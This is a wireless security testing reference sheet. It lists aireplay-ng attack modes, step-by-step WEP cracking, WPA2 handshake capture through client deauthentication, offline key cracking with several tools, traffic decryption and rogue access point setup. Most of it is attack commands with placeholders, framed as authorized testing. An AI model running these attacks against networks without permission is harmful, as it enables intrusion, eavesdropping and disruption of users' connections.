# Wireless Security Testing Reference Guide

## Basic Interface Management

### Monitor Mode Setup
```bash
# Set interface down
sudo ip link set wlan0 down

# Set monitor mode
sudo iwconfig wlan0 mode monitor

# Set interface up
sudo ip link set wlan0 up
```

### Channel Management
```bash
# Set channel 6, width 40 MHz
sudo iw wlan0 set channel 6 HT40-

# Set channel 149, width 80 MHz
sudo iw wlan0 set freq 5745 80 5775
```

### Power Management
```bash
sudo iwconfig wlan0 txpower 30
# or
sudo iw wlan0 set txpower fixed 3000
```

## Aireplay-ng Attack Options

0. Deauthentication (WPA Capture)
   - Used to capture handshakes
   - Command: `aireplay-ng -0 1 -a <AP_MAC> -c <CLIENT_MAC> mon0`

1. Fake Authentication
   - Associates with access point
   - Required for packet injection attacks
   - Command: `aireplay-ng -1 0 -e <ESSID> -a <AP_MAC> -h <OUR_MAC> mon0`

2. Interactive Packet Replay
   - WEP cracking with client
   - Command: `aireplay-ng -2 -b <AP_MAC> -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 mon0`

3. ARP Request Replay
   - WEP cracking with client
   - Generates initialization vectors
   - Command: `aireplay-ng -3 -b <AP_MAC> -h <OUR_MAC> mon0`

4. Korek ChopChop
   - WEP cracking without client
   - Command: `aireplay-ng -4 -b <AP_MAC> -h <OUR_MAC> mon0`

5. Fragmentation Attack
   - WEP cracking without client
   - Command: `aireplay-ng -5 -b <AP_MAC> -h <OUR_MAC> mon0`

## WEP Testing Methodology

### With Client Present
1. Set monitor mode:
```bash
airmon-ng start wlan0 <channel>
```

2. Start packet capture:
```bash
airodump-ng -c <channel> --bssid <AP_MAC> -w <filename> mon0
```

3. Fake authentication:
```bash
aireplay-ng -1 0 -e <ESSID> -a <AP_MAC> -h <OUR_MAC> mon0
```

4. ARP replay attack:
```bash
aireplay-ng -3 -b <AP_MAC> -h <OUR_MAC> mon0
```

5. Optional: Deauth clients:
```bash
aireplay-ng -0 1 -a <AP_MAC> -c <CLIENT_MAC> mon0
```

6. Crack captured packets:
```bash
aircrack-ng -0 <capfile>
```

### PTW Attack
1. Monitor mode setup:
```bash
airmon-ng start wlan0 <channel>
```

2. Capture packets:
```bash
airodump-ng -c <channel> --bssid <AP_MAC> -w <filename> mon0
```

3. Authenticate:
```bash
aireplay-ng -1 60 -e <ESSID> -a <AP_MAC> -h <OUR_MAC> mon0
```

4. Interactive replay:
```bash
aireplay-ng -2 -b <AP_MAC> -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 mon0
```

5. Crack key:
```bash
aircrack-ng -0 -z -n 64 <filename>
```

### Clientless WEP Testing (Fragmentation)
1. Authenticate with persistence:
```bash
aireplay-ng -1 60 -e <ESSID> -b <AP_MAC> -h <OUR_MAC> mon0
```

2. Fragmentation attack:
```bash
aireplay-ng -5 -b <AP_MAC> -h <OUR_MAC> mon0
```

3. Forge ARP packet:
```bash
packetforge-ng -0 -a <AP_MAC> -h <OUR_MAC> -l <SOURCE_IP> -k <DEST_IP> -y fragment.xor -w inject.cap
```

4. Inject packet:
```bash
aireplay-ng -2 -r inject.cap mon0
```

## WPA2-PSK Testing

### Capturing Handshake
1. Start monitor mode:
```bash
airmon-ng start wlan0 <channel>
```

2. Capture packets:
```bash
airodump-ng -c <channel> --bssid <AP_MAC> -w wpa_cap mon0
```

3. Deauth client:
```bash
aireplay-ng -0 1 -a <AP_MAC> -c <CLIENT_MAC> mon0
```

### Cracking Tools

#### Aircrack-ng
```bash
aircrack-ng -0 -w wordlist.txt wpa_cap.cap
```

#### John the Ripper with Rules
```bash
./john --wordlist=wordlist.txt --rules --stdout | aircrack-ng -0 -e <ESSID> -w - capture.cap
```

#### Cowpatty
```bash
# Direct cracking
cowpatty -r capture.cap -f wordlist.txt -2 -s <ESSID>

# Rainbow table generation
genpmk -f wordlist.txt -d hashes.db -s <ESSID>

# Rainbow table attack
cowpatty -r capture.cap -d hashes.db -2 -s <ESSID>
```

#### Pyrit
```bash
# Analyze capture
pyrit -r capture.cap analyze

# Strip unnecessary data
pyrit -r capture.cap -o clean.cap strip

# Direct attack
pyrit -r clean.cap -i wordlist.txt -b <AP_MAC> attack_passthrough

# Database preparation
pyrit -i wordlist.txt import_passwords
pyrit -e <ESSID> create_essid
pyrit batch

# Database attack
pyrit -r clean.cap attack_db
```

## Additional Tools

### Airdecap-ng
```bash
# Basic decryption
airdecap-ng -b <AP_MAC> capture.cap

# WEP decryption
airdecap-ng -w <WEP_KEY> capture.cap

# WPA decryption
airdecap-ng -e <ESSID> -p <PASSWORD> capture.cap
```

### Airserv-ng
```bash
# Start server
airserv-ng -p 1337 -c <channel> -d mon0
```

### Airgraph-ng
```bash
# Client/AP relationship graph
airgraph-ng -i capture.csv -g CAPR -o output.png

# Client probe graph
airgraph-ng -i capture.csv -g CPG -o probes.png
```

### Rogue AP Setup
```bash
# Basic AP
airbase-ng -c <channel> -e <ESSID> mon0

# WEP-encrypted AP
airbase-ng -c <channel> -e <ESSID> -z 4 -W 1 mon0
```

## Testing Best Practices

1. Document all testing activities
2. Obtain proper authorization
3. Use dedicated testing hardware
4. Keep tools updated
5. Follow scope limitations
6. Preserve evidence
7. Maintain detailed logs
8. Report findings responsibly

## Hardware Recommendations

1. Compatible wireless card with monitor mode support
2. External antennas for better reception
3. Multiple testing interfaces
4. Spectrum analysis capability
5. GPS for location mapping (optional)

## Troubleshooting

### Common Issues
1. Network Manager Interference
   - Solution: `airmon-ng check kill`
   
2. Channel Hopping
   - Lock to specific channel
   - Check for mode conflicts

3. Signal Strength
   - Check proximity
   - Verify antenna positioning
   - Review power settings

4. Driver Issues
   - Verify compatibility
   - Update drivers
   - Check firmware

## Documentation & Research

### Essential Reading
1. Wireless Security Standards
2. Protocol Specifications
3. Tool Documentation
4. Current Attack Methodologies
5. Defense Strategies
6. Industry Best Practices

### Lab Setup Guide
1. Dedicated testing environment
2. Updated tool suite
3. Documentation system
4. Traffic generation tools
5. Automated testing frameworks